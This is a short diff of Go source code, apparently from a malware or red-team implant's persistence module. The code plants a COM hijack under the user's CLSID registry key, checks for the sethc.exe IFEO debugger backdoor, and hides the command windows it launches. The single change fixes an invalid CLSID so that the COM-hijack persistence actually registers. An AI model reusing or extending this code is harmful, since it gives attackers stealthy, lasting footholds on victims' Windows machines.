@@ -317,7 +317,7 @@ func persistCOMHijack(args string) string {
 		}
 		binaryPath = p
 	}
-	clsid := "{B5F8350B-0548-4B5G-A625-EC63F3824F4E}"
+	clsid := "{B5F8350B-0548-4B5A-A625-EC63F3824F4E}"
 	keyBase := fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid)
 	cmds := [][]string{
 		{"reg", "add", keyBase, "/f"},
@@ -419,7 +419,7 @@ func listPersistence() string {
 		results = append(results, "[-] IFEO sethc.exe debugger: not found")
 	}
 
-	cmd6 := exec.Command("reg", "query", `HKCU\Software\Classes\CLSID\{B5F8350B-0548-4B5G-A625-EC63F3824F4E}`)
+	cmd6 := exec.Command("reg", "query", `HKCU\Software\Classes\CLSID\{B5F8350B-0548-4B5A-A625-EC63F3824F4E}`)
 	applyHideWindow(cmd6)
 	if out, _ := cmd6.CombinedOutput(); len(out) > 0 {
 		results = append(results, "[+] COM hijack CLSID: found")
@@ -511,7 +511,7 @@ func removePersistence(method string, args string) string {
 		return "image_file: removed IFEO debugger"
 
 	case "com_hijack":
-		clsid := "{B5F8350B-0548-4B5G-A625-EC63F3824F4E}"
+		clsid := "{B5F8350B-0548-4B5A-A625-EC63F3824F4E}"
 		cmd := exec.Command("reg", "delete", fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid), "/f")
 		applyHideWindow(cmd)
 		out, err := cmd.CombinedOutput()
